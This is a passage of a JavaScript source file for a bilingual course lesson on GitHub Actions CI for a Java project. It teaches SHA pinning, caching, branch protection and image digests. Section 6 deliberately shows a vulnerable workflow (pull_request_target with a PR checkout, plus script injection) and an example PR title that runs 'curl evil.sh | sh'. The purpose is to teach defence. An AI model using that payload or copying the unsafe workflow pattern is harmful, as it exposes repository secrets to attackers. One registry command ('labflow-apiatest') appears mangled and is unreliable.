  <li>Toyota Motor Corporation, thông báo về khả năng lộ địa chỉ email khách hàng (T-Connect), 07/10/2022.</li>
  <li>Mọi số đo: image LabFlow trên máy dựng bài của khoá (Docker 29.6.2, eclipse-temurin 21), tháng 11/2026.</li>
</ul>
</div>
`;

// ===== Bài 17.3 =====
const MA173_CI = yml("# .github/workflows/ci.yml\nname: ci\non:\n  pull_request:\n  push:\n    branches: [main]\n# Mặc định token của workflow chỉ được ĐỌC mã; job nào cần hơn thì tự xin ở job đó\npermissions:\n  contents: read\n# Đẩy commit mới lên cùng nhánh ⇒ huỷ lượt chạy cũ, không xếp hàng vô ích\nconcurrency:\n  group: ci-${{ github.ref }}\n  cancel-in-progress: true\njobs:\n  test:\n    runs-on: ubuntu-24.04\n    timeout-minutes: 20\n    steps:\n      # ghim theo SHA của commit (tag có thể bị dời sang commit khác), chú thích ghi phiên bản cho người đọc\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n      - uses: actions/setup-java@d1374f8ac74474200d16ef8ecee22c7ae7a51880 # v6.3.0\n        with:\n          distribution: temurin\n          java-version: \"21\"\n          cache: maven # lưu ~/.m2/repository, khoá = băm của mọi pom.xml\n      # test thật: Testcontainers dùng Docker có sẵn trên runner ubuntu\n      - run: mvn -B -ntp verify\n      - uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2\n        if: failure()\n        with:\n          name: surefire-reports\n          path: target/surefire-reports\n          retention-days: 7\n  image:\n    needs: test\n    if: github.event_name == 'push' && github.ref == 'refs/heads/main'\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n      packages: write # chỉ job này được đẩy image\n    steps:\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n      - uses: docker/setup-buildx-action@f87e5991a6d7451dcb8d9637bfbc97413f497069 # v4.4.1\n      - uses: docker/login-action@8aa5831fb8d48d8f76594c7ddde61ae58019f550 # v4.8.0\n        with:\n          registry: ghcr.io\n          username: ${{ github.actor }}\n          password: ${{ secrets.GITHUB_TOKEN }}\n      - uses: docker/build-push-action@c3c9e263c25d99ce0380d002d59b67737d91b0dc # v7.4.0\n        with:\n          push: true\n          # ghcr.io đòi tên viết thường: đặt tên repo viết thường hoặc dùng docker/metadata-action\n          tags: ghcr.io/${{ github.repository }}/api:${{ github.sha }}\n          cache-from: type=gha\n          cache-to: type=gha,mode=max");
const MA173_RUNNER = bash("# một \"runner\": container sạch, chỉ thấy mã đã commit (clone), ~/.m2 nằm trong volume sb-c17-m2 (= actions/setup-java cache: maven)\nrunner() { docker run --rm --name sb-c17-runner --memory 2g --memory-swap 2g --cpus 2 $DK -e MAVEN_OPTS=-Xmx768m \\\n  -v sb-c17-m2:/root/.m2 -v $W:/w -w /w --entrypoint \"\" maven:3.9-eclipse-temurin-21 \"$@\"; }\ncheckout() { docker run --rm -v $(dirname $W):/p alpine rm -rf /p/ws; rm -rf $W; git clone -q ${1:-$P} $W && git -C $W log --oneline -1; }");
const OUT173_LANH = out("# lượt 1 — runner mới, ~/.m2 TRỐNG (cache miss)\n$ docker volume create sb-c17-m2 && git clone labflow ws\n987c92a LabFlow: cache Redis cho phòng lab, request chậm (dev) để thử tắt êm\n$ runner mvn -B -ntp verify\ntc.postgres:16  Container postgres:16 started in PT3.576290567S\ntc.redis:7-alpine  Container redis:7-alpine started in PT1.076718477S\n[ERROR] Surefire is going to kill self fork JVM. The exit has elapsed 30 seconds after System.exit(0).\nTests run: 16, Failures: 0, Errors: 0, Skipped: 0\nBUILD SUCCESS\nTotal time:  02:03 min\n⏱ 133.5 s\n$ du -sh /root/.m2/repository\n149.0M\t/root/.m2/repository\n\n# lượt 2 — runner mới, clone mới, ~/.m2 khôi phục từ cache (cache hit)\n$ runner mvn -B -ntp verify\n[ERROR] Surefire is going to kill self fork JVM. The exit has elapsed 30 seconds after System.exit(0).\nTests run: 16, Failures: 0, Errors: 0, Skipped: 0\nBUILD SUCCESS\nTotal time:  01:06 min\n⏱ 68.8 s\n\n# lượt 3 — cache hit, sau khi sửa connection-timeout của Hikari trong test (mục 2b)\n$ runner mvn -B -ntp verify\nTests run: 16, Failures: 0, Errors: 0, Skipped: 0\nBUILD SUCCESS\nTotal time:  41.352 s\n⏱ 43.3 s");
const OUT173_DUMP = out("$ docker exec sb-c17-runner jcmd <pid của JVM test> Thread.print    # 8 s sau khi test cuối xong\n\"main\" #1 [63]\n   java.lang.Thread.State: WAITING (on object monitor)\n\tat java.lang.ApplicationShutdownHooks.runHooks(ApplicationShutdownHooks.java:114)\n\tat java.lang.System.exit(System.java:1921)\n\tat org.apache.maven.surefire.booter.ForkedBooter.acknowledgedExit(ForkedBooter.java:381)\n\n\"SpringApplicationShutdownHook\" #24 [219]\n   java.lang.Thread.State: TIMED_WAITING (parking)\n\tat com.zaxxer.hikari.pool.HikariPool.getConnection(HikariPool.java:160)\n\tat jdk.proxy2.$Proxy260.findIncompletePublications(jdk.proxy2/Unknown Source)\n\tat org.springframework.modulith.events.core.DefaultEventPublicationRegistry.destroy(DefaultEventPublicationRegistry.java:268)\n\tat org.springframework.boot.SpringApplicationShutdownHook.closeAndWait(SpringApplicationShutdownHook.java:135)");
const MA173_FIX = java("@DynamicPropertySource\nstatic void biMat(DynamicPropertyRegistry r) {\n    r.add(\"labflow.jwt.secret\", () -> UUID.randomUUID() + \"-\" + UUID.randomUUID());\n    // Lúc JVM test tắt, PostgreSQL của Testcontainers đã dừng trước khi Spring đóng context; Spring Modulith vẫn\n    // mở một giao dịch để tìm sự kiện dở dang ⇒ Hikari chờ đủ connection-timeout (mặc định 30 s) mỗi lần chạy.\n    r.add(\"spring.datasource.hikari.connection-timeout\", () -> \"2000\");\n}");
const OUT173_DO = out("$ git switch -c pr-15-ngay && git diff\n-        if (start.isAfter(now.plusDays(14))) return Optional.of(\"TOO_FAR_AHEAD\");\n+        if (start.isAfter(now.plusDays(15))) return Optional.of(\"TOO_FAR_AHEAD\");\n$ runner mvn -B -ntp verify\n[ERROR] Tests run: 10, Failures: 1, Errors: 0, Skipped: 0, Time elapsed: 0.084 s <<< FAILURE!\nexpected: \"TOO_FAR_AHEAD\"\n but was: null\n[ERROR] Failures: \n[ERROR]   QuyTacDatTest.khungGio:26 \n[ERROR] Tests run: 16, Failures: 1, Errors: 0, Skipped: 0\n[INFO] BUILD FAILURE\n[ERROR] Failed to execute goal surefire:test … There are test failures.\n$ echo $?\n1");
const OUT173_REG = out("# registry cục bộ (registry:2) đóng vai ghcr.io; tag = SHA ngắn của commit\n$ docker tag sb-c17-labflow:1.0.0 127.0.0.1:41872/labflow-api:987c92a && docker push 127.0.0.1:41872/labflow-api:987c92a\nThe push refers to repository [127.0.0.1:41872/labflow-api]\n070fa62398da: Pushed\n… (13 lớp)\n987c92a: digest: sha256:6ba353877a24e463c88a040be1b5b5b38c01f9f9bd3daed38613295062b1ad03 size: 856\n\n$ docker tag sb-c17-labflow:1.0.0 127.0.0.1:41872/labflow-apiatest && docker push 127.0.0.1:41872/labflow-apiatest\nlatest: digest: sha256:6ba353877a24e463c88a040be1b5b5b38c01f9f9bd3daed38613295062b1ad03 size: 856\n\n# ai đó đẩy một image KHÁC lên cùng tag latest\n$ docker push 127.0.0.1:41872/labflow-apiatest\nlatest: digest: sha256:cf974c3db139faeb0b0fc486051e7c5b08125cc165b2af5b130a9fcefe65bcb7 size: 856\n\n$ curl -s http://127.0.0.1:41872/v2/labflow-api/tags/list\n{\"name\":\"labflow-api\",\"tags\":[\"987c92a\",\"latest\"]}\n\n# kéo theo digest: luôn đúng bản đã kiểm, dù tag có bị dời\n$ docker pull 127.0.0.1:41872/labflow-api@sha256:6ba353877a24e463c88a040be1b5b5b38c01f9f9bd3daed38613295062b1ad03\n127.0.0.1:41872/labflow-api@sha256:6ba353877a24e463c88a040be1b5b5b38c01f9f9bd3daed38613295062b1ad03");
const MA173_DEPBOT = yml("# .github/dependabot.yml\nversion: 2\nupdates:\n  - package-ecosystem: maven\n    directory: /\n    schedule:\n      interval: weekly\n    groups:\n      spring: # gộp các bản Spring thành một PR thay vì mười PR\n        patterns: [\"org.springframework*\"]\n  - package-ecosystem: github-actions # cập nhật cả SHA đã ghim, giữ chú thích # vX.Y.Z\n    directory: /\n    schedule:\n      interval: weekly\n  - package-ecosystem: docker # ảnh nền trong Dockerfile\n    directory: /\n    schedule:\n      interval: weekly");
const OUT173_DEP = out("$ mvn -DprocessDependencyManagement=false versions:display-parent-updates versions:display-dependency-updates versions:display-property-updates\nThe parent project has a newer version:\n  org.springframework.boot:spring-boot-starter-parent  4.1.2 -> 4.2.0\nThe following dependencies in Dependencies have newer versions:\n  org.flywaydb:flyway-database-postgresql ............ 12.4.0 -> 13.13.0\n  org.postgresql:postgresql ......................... 42.7.14 -> 42.7.15\n  org.springdoc:springdoc-openapi-starter-webmvc-ui ..... 3.1.1 -> 3.2.1\n  … (mọi starter của Spring Boot) ........................ 4.1.2 -> 4.2.0\nThe following version property updates are available:\n  ${spring-modulith.version} ........................... 2.1.3 -> 2.2.0");
const MA173_XAU = yml("# .github/workflows/chao-pr.yml — ĐỪNG làm theo\nname: chao-pr\non: pull_request_target\njobs:\n  chao:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n      - run: echo \"Cảm ơn PR ${{ github.event.pull_request.title }}\"\n      - run: mvn -B verify");
const OUT173_LINT = out("$ actionlint ci.yml xau.yml\nxau.yml:10:37: \"github.event.pull_request.title\" is potentially untrusted. avoid using it directly in inline scripts. instead, pass it through an environment variable. …\n   |\n10 |       - run: echo \"Cảm ơn PR ${{ github.event.pull_request.title }}\"\n   |                                  ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$ echo $?\n1\n# ci.yml: không lỗi nào. xau.yml: chỉ bắt được chỗ chèn tiêu đề PR — KHÔNG bắt được pull_request_target + checkout mã của PR");

const L173_EN = `
<div class="ml-en">
<span class="eyebrow">Chapter 17 · Lesson 17.3 · Docker and CI</span>
<h2>CI with GitHub Actions</h2>
<p class="lead">Continuous integration means one simple rule: every change, before it reaches <code>main</code>, is built and tested on a clean machine with the same commands every time. In a team of five (Chapter 18) it is the difference between "it worked on my laptop" and "the PR is green". This lesson writes LabFlow's pipeline line by line, then — because a course machine cannot run GitHub's servers — reproduces exactly what a runner does on the build machine: a clean container, a fresh checkout, an empty or warm Maven cache, Testcontainers talking to a real Docker. It measures cold vs cached runs, shows a red PR being stopped, pushes an image tagged with the commit and tracks it by digest, and lints the workflow — including the kind of workflow that leaked secrets from 23,000 repositories in 2025.</p>

<h3>Everyday picture first</h3>
<p>A restaurant chain has a food inspector who tastes every new dish in a clean test kitchen before it goes on the menu — same scales, same oven, every time. A chef cannot say "but it tasted fine at home". CI is that inspector. Branch protection is the rule that a dish the inspector rejected cannot be printed on the menu, however senior the chef.</p>

<h3>1. The workflow, line by line</h3>
${MA173_CI}
<ul>
  <li><strong><code>on: pull_request</code> + <code>push</code> to <code>main</code></strong>: every PR is checked; <code>main</code> is checked again after merge (two PRs can each be green and still conflict).</li>
  <li><strong><code>permissions: contents: read</code></strong> at the top: the automatic <code>GITHUB_TOKEN</code> can only read code. Only the <code>image</code> job asks for <code>packages: write</code>. If a step is compromised, it gets the least possible.</li>
  <li><strong><code>concurrency</code></strong>: pushing three commits in a row to a PR cancels the two older runs instead of queueing them.</li>
  <li><strong>Actions pinned to a commit SHA</strong> with the version as a comment. A tag like <code>v7</code> can be moved by whoever controls that repository; a SHA cannot (hacker corner below). The SHAs here were read with <code>git ls-remote</code> on 24/11/2026.</li>
  <li><strong><code>setup-java</code> with <code>cache: maven</code></strong>: saves <code>~/.m2/repository</code> after a run and restores it next time, keyed by a hash of every <code>pom.xml</code>. Change the POM ⇒ new key ⇒ a cold run.</li>
  <li><strong><code>mvn -B -ntp verify</code></strong>: batch mode (no colours, no prompts), no download progress bars filling the log, and <code>verify</code> runs unit and integration tests. GitHub's <code>ubuntu-24.04</code> runners have Docker, so Testcontainers starts a real PostgreSQL and Redis with no extra setup.</li>
  <li><strong>Test reports uploaded only on failure</strong>, kept 7 days: when CI is red you download them instead of guessing.</li>
  <li><strong>The image job</strong> runs only after tests pass, only on <code>main</code>, and tags the image with the commit SHA — so every image traces back to exactly one commit.</li>
</ul>

<h3>2. What a runner actually does — reproduced</h3>
<p>A GitHub-hosted runner is a fresh virtual machine: it has never seen your project, it has no <code>.env</code>, no <code>target/</code>, no IntelliJ settings. To measure that honestly without GitHub, the build machine plays the runner: a clean Maven container, the project obtained by <code>git clone</code> (only committed files, like <code>actions/checkout</code>), and <code>~/.m2</code> in a Docker volume that is either empty (no cache) or kept (cache hit):</p>
${MA173_RUNNER}
${OUT173_LANH}
<ul>
  <li><strong>Cold (empty cache): 133.5 s</strong>, of which a large part is Maven downloading 149 MB of dependencies into an empty <code>~/.m2</code>. <strong>Warm (cache restored): 68.8 s.</strong> Same 16 tests, same real PostgreSQL 16 and Redis 7 started by Testcontainers (3.6 s and 1.1 s).</li>
  <li>Both runs also printed a line most people scroll past: <code>Surefire is going to kill self fork JVM. The exit has elapsed 30 seconds after System.exit(0).</code> Thirty seconds of every run spent doing… what? Section 2b finds out.</li>
</ul>
<div class="callout info"><p><strong>A first-week classic.</strong> "Works on my machine, fails in CI" is almost always something that exists only on your machine: an uncommitted file, a <code>.env</code>, a database you started by hand, a dependency in your local <code>~/.m2</code> that is not in any repository, a test that depends on your time zone. A clean clone in a clean container finds all of them before your teammates do.</p></div>


<h3>2b. The 30 seconds nobody noticed</h3>
<p>A warning that appears on every run is easy to ignore — and it was costing 30 of the 68.8 seconds. To see what a JVM is doing, ask it: while the run was in that pause, <code>jcmd … Thread.print</code> inside the runner container:</p>
${OUT173_DUMP}
<p>Read it bottom-up. Surefire's <code>main</code> thread called <code>System.exit</code> and is waiting for shutdown hooks. Spring's shutdown hook is closing the test application context; one bean, Spring Modulith's event publication registry (the event log of Chapter 18), runs a query on close to report unfinished events — and is waiting for a database connection. But Testcontainers had already stopped PostgreSQL, so Hikari waits its full <code>connection-timeout</code>: 30 s. Surefire gives up and kills the JVM, which is the warning. The tests were green the whole time.</p>
<p>The fix is a test-only setting — a short connection timeout, so a dead database fails in 2 s instead of 30:</p>
${MA173_FIX}
<p>Same warm run after the fix: <strong>43.3 s</strong> instead of 68.8 s, and the warning is gone. On GitHub that is 25 s saved on every PR for the whole team. Lesson: treat warnings in CI logs as bugs, and when time disappears, take a thread dump instead of guessing.</p>

<h3>3. A red PR is stopped</h3>
<p>A teammate changes the "book at most 14 days ahead" rule (BR-04) to 15 days in <code>QuyTacDat</code> but forgets that the rule is in the specification and the tests:</p>
${OUT173_DO}
<p>The test that checks the exact edge ("14 days + 30 minutes must be refused") fails, Maven exits with code 1, the job is red. On GitHub, <strong>branch protection</strong> on <code>main</code> ("Require status checks to pass: <code>test</code>", "Require a pull request before merging", plus the CODEOWNERS of Chapter 18) disables the merge button until it is green. Either the rule change is intended — then the spec and the test change in the same PR and a reviewer approves it — or it was a mistake, caught in minutes instead of by a student who booked a lab for the wrong week.</p>

<h3>4. Build and push the image: tags move, digests do not</h3>
${OUT173_REG}
<p>A tag is a label you can move; a digest (<code>sha256:…</code>) is the hash of the image's content and can never point to anything else. <code>latest</code> above pointed to one image, then someone pushed another under the same name. Deploy what CI tested by <strong>digest</strong> (or by the immutable commit-SHA tag), never by <code>latest</code>. The same idea is why actions are pinned by SHA.</p>

<h3>5. Dependabot: dependencies that update themselves (with tests)</h3>
${MA173_DEPBOT}
<p>Dependabot opens a PR per update (or one per group); the PR runs this same pipeline, so a bump that breaks LabFlow is red before anyone merges it. It also updates the pinned action SHAs and the base image in the Dockerfile. What it would propose for LabFlow today, measured with the Maven versions plugin:</p>
${OUT173_DEP}
<p>Note that Flyway and the PostgreSQL driver show newer versions too, but their versions are managed by the Spring Boot parent. Do not bump them one by one (Flyway 13 with Boot 4.1 is an untested pair); take the parent bump, which moves the whole tested set together — that is what the <code>spring</code> group in <code>dependabot.yml</code> is for.</p>

<h3>6. Lint the workflow itself</h3>
<p>Workflows are code that runs with your secrets, so they get reviewed and linted too. A workflow seen in many tutorials:</p>
${MA173_XAU}
${OUT173_LINT}
<ul>
  <li><strong>Script injection</strong>: <code>\${{ github.event.pull_request.title }}</code> is pasted into a shell script <em>before</em> it runs. A PR titled <code>"; curl evil.sh | sh; echo "</code> runs the attacker's command. Pass untrusted values through <code>env:</code> and quote them as normal variables.</li>
  <li><strong><code>pull_request_target</code> + checking out the PR's code</strong> (a "pwn request"): <code>pull_request_target</code> runs with the repository's secrets and a write token even for PRs from forks; checking out and building the fork's code (<code>mvn verify</code> runs its tests and plugins) hands those secrets to anyone who opens a PR. actionlint did not flag this one — a reviewer must. Use plain <code>pull_request</code> for building untrusted code.</li>
</ul>

<h3>🕵️ Hacker corner — tj-actions/changed-files, March 2025</h3>
<p>On 14 March 2025 the popular action <code>tj-actions/changed-files</code>, used by about 23,000 repositories, was compromised (CVE-2025-30066). The attacker, using a stolen token, moved the project's existing version tags (<code>v35</code>, <code>v44</code>, …) to a malicious commit. That code dumped the runner's memory, extracted secrets and printed them into the build log — and for public repositories, build logs are public. Every workflow that referred to the action by a tag silently ran the new code on its next run. Investigation traced the stolen token to an earlier compromise of another action, <code>reviewdog/action-setup</code> (CVE-2025-30154).</p>
<p>Defences, all in LabFlow's workflow: pin third-party actions by full commit SHA (a moved tag changes nothing), give the token minimal <code>permissions</code>, do not run untrusted code with secrets (<code>pull_request_target</code>), let Dependabot propose SHA updates so pinning does not mean never updating, and if a secret may have been exposed — rotate it.</p>

<h3>Compared with Node.js</h3>
<p>A Node.js pipeline has the same shape — <code>actions/setup-node</code> with <code>cache: npm</code>, <code>npm ci</code>, tests, image — and the same security rules. The Java pipeline is slower (compilation, a bigger dependency set, Testcontainers start-up), so caching and cancelling outdated runs matter more. <code>npm ci</code> installs exactly the lockfile; Maven's equivalent of a lockfile is pinning versions in the POM (Spring Boot's parent and BOMs do that for you).</p>

<h3>At work</h3>
<p>In companies like FPT Software the pipeline is usually GitLab CI or Jenkins rather than GitHub Actions; the ideas transfer one to one (stages, cache key, artifacts, protected branches, masked variables). Team rules you will meet: "no merge on red", "fix a flaky test or quarantine it the same day", "never re-run until green without reading the log", "the person who broke <code>main</code> fixes it first".</p>

<h3>🎤 What the interviewer will ask</h3>
<ol>
  <li><strong>"What does your CI pipeline do?"</strong> — On every PR: checkout, set up JDK with a Maven cache, <code>mvn verify</code> including Testcontainers integration tests, upload reports on failure. On <code>main</code>: build an image tagged with the commit SHA and push it. Branch protection requires the test job.</li>
  <li><strong>"How do you run integration tests against PostgreSQL in CI?"</strong> — Testcontainers: the test starts a real PostgreSQL container on the runner's Docker; <code>@ServiceConnection</code> wires it into Spring. No shared test database, no H2 differences.</li>
  <li><strong>"Why pin actions by SHA?"</strong> — Tags are mutable; whoever controls the action's repository (or steals a token) can move them, as in tj-actions 2025. A SHA is immutable; Dependabot keeps it updated.</li>
  <li><strong>"How do you keep secrets safe in CI?"</strong> — Store them as encrypted CI secrets, least-privilege token permissions per job, never pass them to untrusted code (forks, <code>pull_request_target</code>), never echo them, prefer short-lived credentials (OIDC) over long-lived keys.</li>
  <li><strong>"CI is slow — what do you do?"</strong> — Measure first. Cache dependencies (keyed on the POM), cancel outdated runs, run tests in parallel or split jobs, share one Testcontainers container across test classes, and cache Docker layers (<code>cache-from: type=gha</code>).</li>
</ol>

<h3>🧪 Practice (45 minutes)</h3>
<div class="callout ok"><ol>
  <li>Put <code>ci.yml</code> into your own project. Reproduce a runner on your machine like section 2: clone into an empty folder, run <code>mvn -B -ntp verify</code> in a <code>maven:3.9-eclipse-temurin-21</code> container with an empty volume, then again with the same volume. Record both times.</li>
  <li>Change one business rule without updating its test, run the "runner" again and read the failure. Which line of the Surefire output tells you the expected and actual values?</li>
  <li>Fix <code>xau.yml</code>: keep the friendly comment on PRs but make it safe for PRs from forks.</li>
</ol></div>
${giai('Show the answers', `<p>1. For LabFlow: 133.5 s with an empty volume, 68.8 s with the same volume (43.3 s after the fix of section 2b). The difference is almost entirely downloads; on GitHub the cache restore itself takes a few seconds.</p><p>2. The <code>[ERROR] Failures:</code> block names the test and the assertion message; AssertJ prints "expected … but was …". Surefire also writes <code>target/surefire-reports/*.txt</code> — which is why the workflow uploads that folder on failure.</p><p>3. Use <code>on: pull_request</code> (no secrets for forks), do not check out with secrets in scope, and pass the title through the environment: <code>env: TITLE: \${{ github.event.pull_request.title }}</code> then <code>run: echo "Cảm ơn PR $TITLE"</code>. If you truly need to comment with a write token, split into two workflows: <code>pull_request</code> builds untrusted code without secrets and uploads a result, a separate <code>workflow_run</code> job with a token only posts the comment and never runs PR code.</p>`)}

<h3>🗂 Key terms</h3>
<ul>
  <li><strong>CI (continuous integration)</strong> — build and test every change on a clean machine before merging.</li>
  <li><strong>Runner</strong> — the machine (a fresh VM on GitHub) that executes a job.</li>
  <li><strong>Cache key</strong> — what decides if a saved cache is reused; for Maven, a hash of the <code>pom.xml</code> files.</li>
  <li><strong>Branch protection / required status check</strong> — <code>main</code> only accepts merges whose checks are green.</li>
  <li><strong>Image digest</strong> — <code>sha256:…</code> of an image's content; immutable, unlike a tag.</li>
  <li><strong>SHA pinning</strong> — referring to an action by commit hash instead of a movable tag.</li>
  <li><strong>Script injection</strong> — untrusted text (<code>\${{ … }}</code>) pasted into a shell script.</li>
  <li><strong><code>pull_request_target</code></strong> — trigger that runs with the base repository's secrets; dangerous with PR code.</li>
  <li><strong>Dependabot</strong> — GitHub's bot that opens PRs to update dependencies, actions and base images.</li>
</ul>

<h3>📌 Summary</h3>
<ul>
  <li>Pipeline: least-privilege token, SHA-pinned actions, Maven cache, <code>mvn -B -ntp verify</code> with Testcontainers, reports on failure, image tagged with the commit on <code>main</code>.</li>
  <li>A reproduced runner: cold 133.5 s, cached 68.8 s; a thread dump found 30 s per run lost at shutdown (Spring Modulith waiting for a stopped database) ⇒ 43.3 s after a two-second Hikari timeout in tests.</li>
  <li>A rule changed without its test ⇒ red ⇒ branch protection blocks the merge.</li>
  <li>Tags move (<code>latest</code> changed digest); deploy by digest or commit tag.</li>
  <li>Lint workflows; actionlint catches script injection but not <code>pull_request_target</code> misuse — review does. tj-actions 2025: pin by SHA, rotate secrets.</li>
</ul>

<h3>📚 Go deeper</h3>
${tl('https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions', '🔐', 'GitHub — Security hardening for GitHub Actions', 'Pinning, permissions, script injection.')}
${tl('https://github.com/actions/setup-java#caching-packages-dependencies', '☕', 'actions/setup-java — caching', 'How the Maven cache key is built.')}
${tl('https://java.testcontainers.org/supported_docker_environment/continuous_integration/', '🐳', 'Testcontainers — CI environments', 'GitHub Actions, GitLab, Jenkins.')}
${tl('https://github.com/rhysd/actionlint', '🔎', 'actionlint', 'Static checker for workflow files.')}

<h3>Sources</h3>
<ul>
  <li>CVE-2025-30066 (tj-actions/changed-files) and CVE-2025-30154 (reviewdog/action-setup), GitHub Advisory Database and CISA alert, March 2025.</li>
  <li>Action versions and SHAs: <code>git ls-remote</code> on the official repositories, 24/11/2026.</li>
  <li>All other measurements: LabFlow on this course's build machine, November 2026.</li>
</ul>
</div>
`;

const L173_VI = `
<div class="ml-vi">
<span class="eyebrow">Chương 17 · Bài 17.3 · Docker và CI</span>
<h2>CI với GitHub Actions</h2>
<p class="lead">Tích hợp liên tục (CI) gói trong một luật đơn giản: mọi thay đổi, trước khi vào <code>main</code>, đều được build và test trên một máy sạch bằng đúng những lệnh đó mỗi lần. Trong nhóm năm người (Chương 18), đó là khác biệt giữa "máy em chạy được" và "PR xanh". Bài này viết pipeline của LabFlow từng dòng, rồi — vì máy dựng bài không chạy được máy chủ của GitHub — dựng lại đúng những gì một runner làm: container sạch, checkout mới, cache Maven trống hoặc ấm, Testcontainers nói chuyện với Docker thật. Bài đo lần chạy lạnh và lần có cache, cho thấy một PR đỏ bị chặn, đẩy image gắn tag theo commit và bám nó bằng digest, rồi soát lỗi chính workflow — kể cả kiểu workflow đã làm lộ bí mật của 23 000 repo năm 2025.</p>

<h3>Đời thường trước đã</h3>
<p>Một chuỗi nhà hàng có người kiểm định nếm mọi món mới trong một bếp thử sạch sẽ trước khi đưa vào thực đơn — cùng cân, cùng lò, lần nào cũng vậy. Đầu bếp không được nói "ở nhà em nấu thấy ngon mà". CI chính là người kiểm định đó. Bảo vệ nhánh (branch protection) là luật: món đã bị người kiểm định loại thì không được in vào thực đơn, dù đầu bếp có thâm niên đến đâu.</p>

<h3>1. Workflow, từng dòng</h3>
${MA173_CI}
<ul>
  <li><strong><code>on: pull_request</code> + <code>push</code> lên <code>main</code></strong>: mọi PR đều được kiểm; <code>main</code> được kiểm lại sau khi gộp (hai PR có thể cùng xanh mà vẫn đá nhau).</li>
  <li><strong><code>permissions: contents: read</code></strong> ở đầu tệp: <code>GITHUB_TOKEN</code> tự động chỉ được đọc mã. Chỉ job <code>image</code> xin thêm <code>packages: write</code>. Nếu một bước bị chiếm, nó có ít quyền nhất có thể.</li>
  <li><strong><code>concurrency</code></strong>: đẩy ba commit liên tiếp lên một PR thì hai lượt chạy cũ bị huỷ thay vì xếp hàng.</li>
  <li><strong>Action ghim theo SHA của commit</strong>, phiên bản ghi trong chú thích. Một tag như <code>v7</code> có thể bị người nắm repo đó dời đi; SHA thì không (xem góc hacker). Các SHA ở đây đọc bằng <code>git ls-remote</code> ngày 24/11/2026.</li>
  <li><strong><code>setup-java</code> với <code>cache: maven</code></strong>: lưu <code>~/.m2/repository</code> sau mỗi lượt và khôi phục lần sau, khoá cache là băm của mọi <code>pom.xml</code>. Đổi POM ⇒ khoá mới ⇒ một lượt chạy lạnh.</li>
  <li><strong><code>mvn -B -ntp verify</code></strong>: chế độ batch (không màu, không hỏi), không in thanh tiến độ tải làm đầy log, và <code>verify</code> chạy cả test đơn vị lẫn test tích hợp. Runner <code>ubuntu-24.04</code> của GitHub có sẵn Docker, nên Testcontainers dựng PostgreSQL và Redis thật mà không cần cài thêm.</li>
  <li><strong>Báo cáo test chỉ tải lên khi hỏng</strong>, giữ 7 ngày: CI đỏ thì bạn tải về đọc thay vì đoán.</li>
  <li><strong>Job image</strong> chỉ chạy sau khi test qua, chỉ trên <code>main</code>, và gắn tag image bằng SHA của commit — mỗi image truy ngược được đúng một commit.</li>
</ul>

<h3>2. Runner thật sự làm gì — dựng lại để đo</h3>
<p>Runner của GitHub là một máy ảo mới tinh: chưa từng thấy dự án của bạn, không có <code>.env</code>, không có <code>target/</code>, không có cấu hình IntelliJ. Để đo trung thực mà không cần GitHub, máy dựng bài đóng vai runner: một container Maven sạch, dự án lấy bằng <code>git clone</code> (chỉ tệp đã commit, như <code>actions/checkout</code>), và <code>~/.m2</code> nằm trong một volume Docker hoặc trống (không có cache) hoặc giữ lại (trúng cache):</p>
${MA173_RUNNER}
${OUT173_LANH}
<ul>
  <li><strong>Lạnh (cache trống): 133,5 giây</strong>, phần lớn là Maven tải 149 MB thư viện vào một <code>~/.m2</code> rỗng. <strong>Ấm (cache được khôi phục): 68,8 giây.</strong> Cùng 16 test, cùng PostgreSQL 16 và Redis 7 thật do Testcontainers dựng (3,6 giây và 1,1 giây).</li>
  <li>Cả hai lượt còn in một dòng mà phần lớn mọi người lướt qua: <code>Surefire is going to kill self fork JVM. The exit has elapsed 30 seconds after System.exit(0).</code> Ba mươi giây của mỗi lượt chạy dùng để làm… gì? Mục 2b sẽ tìm ra.</li>
</ul>
<div class="callout info"><p><strong>Kinh điển của tuần đầu.</strong> "Máy em chạy, CI hỏng" gần như luôn là thứ chỉ có trên máy bạn: một tệp chưa commit, một <code>.env</code>, một CSDL bạn tự bật tay, một thư viện trong <code>~/.m2</code> của bạn mà không repo nào có, một test phụ thuộc múi giờ máy bạn. Clone sạch trong container sạch tìm ra hết trước khi đồng đội tìm ra.</p></div>


<h3>2b. Ba mươi giây không ai để ý</h3>
<p>Một cảnh báo lần nào chạy cũng có thì rất dễ bị bỏ qua — và nó đang tốn 30 trong 68,8 giây. Muốn biết JVM đang làm gì thì hỏi chính nó: trong lúc lượt chạy đang dừng ở đó, chạy <code>jcmd … Thread.print</code> trong container runner:</p>
${OUT173_DUMP}
<p>Đọc từ dưới lên. Luồng <code>main</code> của Surefire đã gọi <code>System.exit</code> và đang chờ các shutdown hook. Shutdown hook của Spring đang đóng context của test; một bean, sổ sự kiện của Spring Modulith (event log ở Chương 18), lúc đóng chạy một truy vấn để báo các sự kiện dở dang — và đang chờ lấy kết nối CSDL. Nhưng Testcontainers đã dừng PostgreSQL rồi, nên Hikari chờ đủ <code>connection-timeout</code>: 30 giây. Surefire hết kiên nhẫn và giết JVM, đó chính là dòng cảnh báo. Test thì vẫn xanh suốt từ đầu.</p>
<p>Cách sửa là một cấu hình chỉ cho test — thời hạn kết nối ngắn, để CSDL đã chết thì hỏng sau 2 giây thay vì 30:</p>
${MA173_FIX}
<p>Cùng lượt chạy ấm sau khi sửa: <strong>43,3 giây</strong> thay vì 68,8 giây, và hết cảnh báo. Trên GitHub đó là 25 giây tiết kiệm cho mỗi PR của cả nhóm. Bài học: coi cảnh báo trong log CI là lỗi, và khi thời gian biến mất thì lấy thread dump thay vì đoán.</p>

<h3>3. Một PR đỏ bị chặn lại</h3>
<p>Một đồng đội đổi luật "đặt trước tối đa 14 ngày" (BR-04) thành 15 ngày trong <code>QuyTacDat</code> nhưng quên rằng luật đó nằm trong đặc tả và trong test:</p>
${OUT173_DO}
